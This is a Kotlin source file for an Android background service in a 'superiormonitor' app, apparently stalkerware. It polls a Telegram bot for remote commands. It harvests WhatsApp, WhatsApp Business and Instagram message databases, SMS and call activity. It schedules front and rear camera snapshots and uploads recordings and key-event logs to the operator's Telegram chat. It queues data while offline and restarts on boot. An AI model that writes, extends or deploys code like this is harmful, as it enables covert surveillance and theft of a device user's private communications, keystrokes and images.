package com.system.superiormonitor.bot

import com.system.superiormonitor.core.LogLevel

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.IntentFilter
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.data.UpdateResponse
import com.system.superiormonitor.monitor.CallMonitor
import com.system.superiormonitor.monitor.NetworkEnforcer
import com.system.superiormonitor.monitor.SnapshotScheduler
import com.system.superiormonitor.monitor.WhatsAppMonitor
import com.system.superiormonitor.monitor.InstagramMonitor
import com.system.superiormonitor.monitor.SmsMonitor

import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import com.system.superiormonitor.core.NetworkRecoveryManager
import com.system.superiormonitor.core.TelemetryCollector
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException
import java.net.UnknownHostException
import java.util.concurrent.ConcurrentHashMap
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

/**
 * Foreground service that runs the Telegram bot polling loop and
 * orchestrates all monitor sub-systems (WhatsApp, Calls, Network, Snapshots).
 *
 * Refactored from the original TelegramBotService:
 * - All HTTP calls delegated to [TelegramApi] (was inline with duplicate OkHttpClient)
 * - All command/callback handling delegated to [BotCommands] (was split across 5 files)
 * - Monitor lifecycle management unchanged
 */
class BotService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var prefsManager: PrefsManager? = null
    private var botCommands: BotCommands? = null
    private var networkEnforcer: NetworkEnforcer? = null

    private var lastUpdateId: Long = 0
    private val startTime = System.currentTimeMillis() / 1000L
    private var hasSentBootMessage = false
    private var isFromBoot = false

    private var pollingJob: Job? = null
    private var networkRecoveryManager: NetworkRecoveryManager? = null
    private var whatsAppMonitor: WhatsAppMonitor? = null
    private var waBusinessMonitor: WhatsAppMonitor? = null
    private var instagramMonitor: InstagramMonitor? = null
    private var callMonitor: CallMonitor? = null
    private var smsMonitor: SmsMonitor? = null
    
    private val appInstallReceiver = com.system.superiormonitor.core.AppInstallReceiver()

    private val unauthorizedAccessAttempts = object : java.util.LinkedHashMap<String, Int>(50, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Int>?): Boolean {
            return size > 50
        }
    }

    // Live Text Batching Properties
    private val messageBuffers = ConcurrentHashMap<String, MutableList<Pair<String, String?>>>()
    private val throttleJobs = ConcurrentHashMap<String, Job>()
    private val sendMutex = Mutex()

    companion object {
        const val CHANNEL_ID = "TelegramBotServiceChannel"
        const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        // DO NOT INITIALIZE NETWORK OR PREFS HERE to comply with Android 14+ strict requirements
        
        // Dynamically register AppInstallReceiver to bypass BroadcastQueue restrictions
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addAction(Intent.ACTION_PACKAGE_REMOVED)
            addDataScheme("package")
        }
        registerReceiver(appInstallReceiver, filter)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // MUST BE FIRST for Android 14+ compliance (fixes ForegroundServiceDidNotStartInTimeException)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        // NOW SAFE TO INITIALIZE DEPENDENCIES (Fixes NullPointerException in dynamic handlers)
        if (prefsManager == null) prefsManager = PrefsManager.getInstance(this)
        if (botCommands == null) botCommands = BotCommands(this, serviceScope)

        val action = intent?.action
        if (action != null) {
            LogManager.log(LogCategory.SYSTEM, "Bot Service received intent action: $action")
        }

        // ── Dynamic feature toggle actions (no need to restart whole service) ──
        when (action) {
            "ACTION_UPDATE_WHATSAPP" -> {
                handleMonitorToggle(prefsManager?.whatsappUpdatesEnabled == true, whatsAppMonitor, { startWhatsAppMonitorIfEnabled() }, { whatsAppMonitor?.stop(); whatsAppMonitor = null }, "WhatsApp Monitor")
                return START_STICKY
            }
            "ACTION_UPDATE_WABUSINESS" -> {
                handleMonitorToggle(prefsManager?.whatsappBusinessUpdatesEnabled == true, waBusinessMonitor, { startWABusinessMonitorIfEnabled() }, { waBusinessMonitor?.stop(); waBusinessMonitor = null }, "WA Business Monitor")
                return START_STICKY
            }
            "ACTION_UPDATE_INSTAGRAM" -> {
                handleMonitorToggle(prefsManager?.instagramEnabled == true, instagramMonitor, { startInstagramMonitorIfEnabled() }, { instagramMonitor?.stop(); instagramMonitor = null }, "Instagram Monitor")
                return START_STICKY
            }
            "ACTION_UPDATE_CALL_ALERTS" -> {
                handleMonitorToggle(prefsManager?.callAlertsEnabled == true, callMonitor, { startCallMonitorIfEnabled() }, { callMonitor?.stop(); callMonitor = null }, "Call Monitor")
                return START_STICKY
            }
            "ACTION_UPDATE_SMS_ALERTS" -> {
                handleMonitorToggle(prefsManager?.smsAlertsEnabled == true, smsMonitor, { startSmsMonitorIfEnabled() }, { smsMonitor?.stop(); smsMonitor = null }, "SMS Monitor")
                return START_STICKY
            }
            "ACTION_UPLOAD_RECORDING" -> {
                if (intent != null) MediaUploader.handleUploadRecording(this, intent, prefsManager!!)
                return START_STICKY
            }
            "ACTION_UPLOAD_SNAPSHOT" -> {
                if (intent != null) MediaUploader.handleUploadSnapshot(this, intent, serviceScope, prefsManager!!)
                return START_STICKY
            }
            "ACTION_UPLOAD_KEY_EVENTS" -> {
                MediaUploader.handleUploadKeyEvents(this, serviceScope, prefsManager!!)
                return START_STICKY
            }
            "ACTION_POPUP_ACKNOWLEDGED" -> {
                serviceScope.launch(Dispatchers.IO) {
                    sendToTelegram("✅ *The user has acknowledged and dismissed the popup on the device.*")
                }
                return START_STICKY
            }
        }

        // ── Full service startup (Only for null or unknown actions like boot/initial start) ──
        if (networkEnforcer == null) {
            networkEnforcer = NetworkEnforcer(this, prefsManager!!)
            networkEnforcer?.start()
        }

        LogManager.setServiceRunning(true)
        LogManager.log(LogCategory.SYSTEM, "Service Started")

        val currentPrefs = prefsManager
        if (currentPrefs == null || currentPrefs.botToken.isBlank() || currentPrefs.chatId.isBlank() || currentPrefs.ownerUserId.isBlank()) {
            LogManager.log(LogCategory.SYSTEM, "Error: Credentials are missing.", LogLevel.ERROR)
            stopSelf()
            return START_NOT_STICKY
        }

        // Start monitors if enabled
        startWhatsAppMonitorIfEnabled()
        startWABusinessMonitorIfEnabled()
        startInstagramMonitorIfEnabled()
        startCallMonitorIfEnabled()
        startSmsMonitorIfEnabled()
        
        // Restore AlarmManager schedules (they are wiped by Android on reboot)
        LogManager.log(LogCategory.SNAPSHOTS, "Restoring active camera schedules from persistent preferences...")
        val scheduler = SnapshotScheduler(this)
        if (prefsManager?.enableSnapshots == true) scheduler.scheduleNextSnapshot()
        if (prefsManager?.enableFrontCamera == true) scheduler.scheduleNextCamera(1)
        if (prefsManager?.enableRearCamera == true) scheduler.scheduleNextCamera(0)

        isFromBoot = intent?.getBooleanExtra("from_boot", false) == true

        setupNetworkRecoveryManager()
        networkRecoveryManager?.registerNetworkCallback()

        return START_STICKY
    }

    // ═══════════════════════════════════════════════════════════
    //  DYNAMIC FEATURE TOGGLES
    // ═══════════════════════════════════════════════════════════

    private fun handleMonitorToggle(isEnabled: Boolean, currentMonitor: Any?, startAction: () -> Unit, stopAction: () -> Unit, name: String) {
        if (isEnabled) {
            if (currentMonitor == null) {
                startAction()
                LogManager.log(LogCategory.SYSTEM, "$name dynamically started.")
            }
        } else {
            stopAction()
            LogManager.log(LogCategory.SYSTEM, "$name dynamically stopped.")
        }
    }

    private fun sendToTelegram(text: String, parseMode: String? = null): Boolean {
        val chatId = prefsManager?.chatId ?: return false
        val token = prefsManager?.botToken ?: return false
        return TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode) != null
    }

    private fun handleLiveMessage(source: String, message: String, parseMode: String?, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
        val buffer = messageBuffers.getOrPut(source) { mutableListOf() }
        synchronized(buffer) {
            buffer.add(Pair(message, parseMode))
            
            // Safety limit (25 messages)
            if (buffer.size >= 25) {
                // Cancel the existing throttle job and process instantly
                throttleJobs[source]?.cancel()
                processLiveMessageBuffer(source, offlineSubdir, offlineFileName, captionBuilder)
                return
            }
        }
        
        if (throttleJobs[source]?.isActive != true) {
            throttleJobs[source] = serviceScope.launch(Dispatchers.IO) {
                delay(3000) // 3 seconds wait from first message
                processLiveMessageBuffer(source, offlineSubdir, offlineFileName, captionBuilder)
            }
        }
    }

    private fun processLiveMessageBuffer(source: String, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
        serviceScope.launch(Dispatchers.IO) {
            val buffer = messageBuffers.getOrPut(source) { mutableListOf<Pair<String, String?>>() }
            val messagesToSend = synchronized(buffer) {
                val copy = buffer.toList()
                buffer.clear()
                copy
            }
        
        if (messagesToSend.isEmpty()) return@launch
        
        sendMutex.withLock {
            if (messagesToSend.size <= 3) {
                // Send individually with 1s delay
                for ((msg, parseMode) in messagesToSend) {
                    val success = sendToTelegram(msg, parseMode)
                    if (!success) {
                        com.system.superiormonitor.bot.OfflineManager.queueOnly(this@BotService, msg, offlineSubdir, offlineFileName)
                    }
                    delay(1000)
                }
            } else {
                // Send as a txt document
                val combinedText = messagesToSend.joinToString("\n\n--------------------------------------------------\n\n") { it.first }
                val tempFile = File(cacheDir, "${source}_bulk.txt")
                try {
                    tempFile.writeText(combinedText)
                } catch (e: Exception) {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to write bulk text to cache: ${e.message}", LogLevel.ERROR)
                    com.system.superiormonitor.bot.OfflineManager.queueOnly(this@BotService, combinedText, offlineSubdir, offlineFileName)
                    return@withLock
                }
                
                val currentPrefs = prefsManager ?: return@withLock
                val success = MediaUploader.uploadDocument(
                    context = this@BotService,
                    token = currentPrefs.botToken,
                    chatId = currentPrefs.chatId,
                    file = tempFile,
                    caption = captionBuilder(),
                    deleteOnSuccess = true,
                    fallbackOfflineSubdir = null // We handle fallback manually to append to the standard text log
                )
                
                if (!success) {
                    // Hand over to offline manager
                    com.system.superiormonitor.bot.OfflineManager.queueOnly(this@BotService, combinedText, offlineSubdir, offlineFileName)
                    if (tempFile.exists()) tempFile.delete()
                }
            }
        }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  MONITOR LIFECYCLE
    // ═══════════════════════════════════════════════════════════

    private fun startWhatsAppMonitorIfEnabled() {
        if (prefsManager?.whatsappUpdatesEnabled == true) {
            serviceScope.launch(Dispatchers.IO) {
                if (whatsAppMonitor == null) {
                    // Fail-safe: Verify WhatsApp is installed and database is accessible
                    if (!WhatsAppMonitor.isWhatsAppInstalled(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)) {
                        LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: WhatsApp is not installed. Disabling toggle.")
                        prefsManager?.whatsappUpdatesEnabled = false
                        return@launch
                    }
                    val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)
                    if (!dbAvailable) {
                        LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: $dbReason. Disabling toggle.")
                        prefsManager?.whatsappUpdatesEnabled = false
                        return@launch
                    }

                    whatsAppMonitor = WhatsAppMonitor(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL) { text, parseMode ->
                        handleLiveMessage("whatsapp", text, parseMode, "whatsapp", "offline_whatsapp.txt") { BotMessages.Core.buildBulkUploadMessage("WhatsApp") }
                        true
                    }
                    LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor initialized.")
                }
                whatsAppMonitor?.start(serviceScope)
            }
        }
    }

    private fun startWABusinessMonitorIfEnabled() {
        if (prefsManager?.whatsappBusinessUpdatesEnabled == true) {
            serviceScope.launch(Dispatchers.IO) {
                if (waBusinessMonitor == null) {
                    // Fail-safe: Verify WhatsApp Business is installed and database is accessible
                    if (!WhatsAppMonitor.isWhatsAppInstalled(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)) {
                        LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: WhatsApp Business is not installed. Disabling toggle.")
                        prefsManager?.whatsappBusinessUpdatesEnabled = false
                        return@launch
                    }
                    val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)
                    if (!dbAvailable) {
                        LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: $dbReason. Disabling toggle.")
                        prefsManager?.whatsappBusinessUpdatesEnabled = false
                        return@launch
                    }

                    waBusinessMonitor = WhatsAppMonitor(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS) { text, parseMode ->
                        handleLiveMessage("wabusiness", text, parseMode, "wabusiness", "offline_wabusiness.txt") { BotMessages.Core.buildBulkUploadMessage("WhatsApp Business") }
                        true
                    }
                    LogManager.log(LogCategory.SYSTEM, "WA Business Monitor initialized.")
                }
                waBusinessMonitor?.start(serviceScope)
            }
        }
    }

    private fun startInstagramMonitorIfEnabled() {
        if (prefsManager?.instagramEnabled == true) {
            serviceScope.launch(Dispatchers.IO) {
                if (instagramMonitor == null) {
                    // Fail-safe: Verify Instagram is installed and database is accessible
                    if (!InstagramMonitor.isInstagramInstalled(this@BotService)) {
                        LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: Instagram is not installed. Disabling toggle.")
                        prefsManager?.instagramEnabled = false
                        return@launch
                    }
                    val (dbAvailable, dbReason) = InstagramMonitor.checkInstagramDatabase()
                    if (!dbAvailable) {
                        LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: $dbReason Disabling toggle.")
                        prefsManager?.instagramEnabled = false
                        return@launch
                    }

                    instagramMonitor = InstagramMonitor(this@BotService) { text, parseMode ->
                        handleLiveMessage("instagram", text, parseMode, "instagram", "offline_instagram.txt") { BotMessages.Core.buildBulkUploadMessage("Instagram") }
                        true
                    }
                    LogManager.log(LogCategory.SYSTEM, "Instagram Monitor initialized.")
                }
                instagramMonitor?.start(serviceScope)
            }
        }
    }

    private fun startCallMonitorIfEnabled() {
        if (prefsManager?.callAlertsEnabled == true && callMonitor == null) {
            callMonitor = CallMonitor(this) { text, parseMode ->
                handleLiveMessage("call", text, parseMode, "call", "offline_calls.txt") { BotMessages.Core.buildBulkUploadMessage("Calls") }
                true
            }
            callMonitor?.start()
        }
    }

    private fun startSmsMonitorIfEnabled() {
        if (prefsManager?.smsAlertsEnabled == true) {
            if (smsMonitor == null) {
                smsMonitor = SmsMonitor(this) { text, parseMode ->
                    handleLiveMessage("sms", text, parseMode, "sms", "offline_sms.txt") { BotMessages.Core.buildBulkUploadMessage("SMS") }
                    true
                }
                smsMonitor?.start()
                LogManager.log(LogCategory.SYSTEM, "SMS Monitor started.")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  NETWORK RECOVERY
    // ═══════════════════════════════════════════════════════════

    private fun setupNetworkRecoveryManager() {
        if (networkRecoveryManager != null) return
        networkRecoveryManager = NetworkRecoveryManager(this, serviceScope, object : NetworkRecoveryManager.NetworkCallbacks {
            override fun onNetworkAvailable() {
                startWhatsAppMonitorIfEnabled()
                startWABusinessMonitorIfEnabled()
                startInstagramMonitorIfEnabled()
            }

            override fun onNetworkLost() {
                whatsAppMonitor?.stop()
                waBusinessMonitor?.stop()
                instagramMonitor?.stop()
            }

            override fun startPollingLoop() {
                pollingJob?.cancel()
                pollingJob = serviceScope.launch(Dispatchers.IO) {
                    this@BotService.startPollingLoop()
                }
            }

            override fun stopPollingLoop() {
                pollingJob?.cancel()
                pollingJob = null
            }

            override suspend fun sendConnectionRestoredNotification() {
                val chatId = prefsManager?.chatId ?: return
                val token = prefsManager?.botToken ?: return

                val telemetry = TelemetryCollector.gatherTelemetry()
                val title = BotMessages.Alerts.buildConnectionRestoredMessage()
                val msg = BotMessages.Core.buildTelemetryMessage(title, telemetry)
                TelegramApi.sendMessage(token, chatId, msg)

                com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(this@BotService, serviceScope, chatId, null, token)
            }

            override fun isPollingJobActive(): Boolean {
                return pollingJob?.isActive == true
            }

            override fun getBotToken(): String? {
                return prefsManager?.botToken
            }
        })
    }

    // ═══════════════════════════════════════════════════════════
    //  POLLING LOOP
    // ═══════════════════════════════════════════════════════════

    private suspend fun startPollingLoop() {
        LogManager.log(LogCategory.SYSTEM, "Polling loop started...")
        val currentPrefs = prefsManager ?: return

        // Fetch bot username for strict command routing with retry
        var meResponse = TelegramApi.getMe(currentPrefs.botToken)
        while (meResponse?.ok != true && currentCoroutineContext().isActive) {
            LogManager.log(LogCategory.SYSTEM, "Failed to resolve bot identity. Retrying in 5s...", LogLevel.ERROR)
            delay(5000)
            meResponse = TelegramApi.getMe(currentPrefs.botToken)
        }
        botCommands?.setBotUsername(meResponse?.result?.username)

        while (currentCoroutineContext().isActive) {
            try {
                val offset = lastUpdateId + 1
                val response = TelegramApi.getUpdatesRaw(currentPrefs.botToken, offset)

                // If we get any HTTP response, the API is reachable
                LogManager.setTelegramApiReachable(true)

                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    if (responseBody != null) {
                        val updateResponse = TelegramApi.json.decodeFromString<UpdateResponse>(responseBody)
                        if (updateResponse.ok) {
                            if (isFromBoot && !hasSentBootMessage) {
                                hasSentBootMessage = true
                                val telemetry = TelemetryCollector.gatherTelemetry()
                                val title = BotMessages.Alerts.buildRebootMessage()
                                val msg = BotMessages.Core.buildTelemetryMessage(title, telemetry)
                                TelegramApi.sendMessage(currentPrefs.botToken, currentPrefs.chatId, msg)
                            }
                            for (update in updateResponse.result) {
                                lastUpdateId = update.update_id
                                handleUpdate(update)
                            }
                            if (updateResponse.result.isEmpty()) {
                                delay(500) // Prevent tight spin-loop
                            }
                        }
                    }
                } else {
                    val errorBody = response.body?.string()
                    LogManager.log(LogCategory.SYSTEM, "HTTP Error: ${response.code} - Body: $errorBody", LogLevel.ERROR)
                    delay(2000)
                }
            } catch (e: Exception) {
                LogManager.setTelegramApiReachable(false)
                if (e is IOException || e is UnknownHostException) {
                    LogManager.log(LogCategory.SYSTEM, "[Network] Transient socket issue detected...")
                } else {
                    LogManager.log(LogCategory.SYSTEM, "Error: ${e.message}", LogLevel.ERROR)
                    Log.e("BotService", "Error in polling loop", e)
                }
                delay(5000)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  UPDATE HANDLING & AUTH
    // ═══════════════════════════════════════════════════════════

    private fun handleUpdate(update: com.system.superiormonitor.data.Update) {
        val incomingChatId: String
        val incomingUserId: String

        if (update.message != null) {
            if (update.message.date < startTime) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Ignoring old message from before service startup.")
                return
            }
            incomingChatId = update.message.chat.id.toString()
            incomingUserId = update.message.from?.id?.toString() ?: ""
        } else if (update.callback_query != null) {
            val cbMsg = update.callback_query.message
            if (cbMsg != null && cbMsg.date < startTime) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Ignoring old callback query from menu sent before service startup.")
                return
            }
            incomingChatId = cbMsg?.chat?.id?.toString() ?: ""
            incomingUserId = update.callback_query.from.id.toString()
        } else if (update.my_chat_member != null) {
            incomingChatId = update.my_chat_member.chat.id.toString()
            incomingUserId = update.my_chat_member.from.id.toString()
        } else {
            return
        }

        val currentPrefs = prefsManager ?: return
        val isAuthorizedChat = incomingChatId == currentPrefs.chatId
        val isAuthorizedUser = incomingUserId == currentPrefs.ownerUserId

        if (!isAuthorizedChat && !isAuthorizedUser) {
            BotActions.handleUnauthorizedAccess(this, serviceScope, update, incomingUserId, incomingChatId, unauthorizedAccessAttempts)
            return
        }

        if (update.message?.text != null) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Received command: ${update.message.text}")
        } else if (update.callback_query != null) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] User selected action: ${update.callback_query.data}")
        } else if (update.message?.photo != null || update.message?.video != null || update.message?.audio != null || update.message?.document != null) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Received media attachment")
        }

        val commands = botCommands ?: return
        val responsePayload = commands.routeUpdate(update)

        if (responsePayload != null && incomingChatId.isNotBlank()) {
            serviceScope.launch(Dispatchers.IO) {
                if (responsePayload.contains("JSON_MARKUP:")) {
                    val parts = responsePayload.split("JSON_MARKUP:", limit = 2)
                    val textPart = parts[0].trim()
                    val markupPart = parts[1].trim()
                    val msgId = TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, textPart, replyMarkup = markupPart)
                    if (msgId != null) {
                        commands.scheduleAutoDelete(incomingChatId, msgId, currentPrefs.botToken)
                    }
                } else {
                    TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, responsePayload)
                }
            }
        }
    }


    // ═══════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ═══════════════════════════════════════════════════════════

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(appInstallReceiver)
        whatsAppMonitor?.stop()
        whatsAppMonitor = null
        waBusinessMonitor?.stop()
        waBusinessMonitor = null
        instagramMonitor?.stop()
        instagramMonitor = null
        callMonitor?.stop()
        callMonitor = null
        smsMonitor?.stop()
        smsMonitor = null
        TelegramApi.cancelAll()
        pollingJob?.cancel()
        serviceJob.cancel()
        networkEnforcer?.stop()
        networkRecoveryManager?.unregisterNetworkCallback()
        networkRecoveryManager = null

        LogManager.setServiceRunning(false)
        LogManager.log(LogCategory.SYSTEM, "Service Stopped")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "SuperiorMonitor Background Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Superior Monitor Active")
            .setContentText("Monitoring system events and bot queries...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }
}
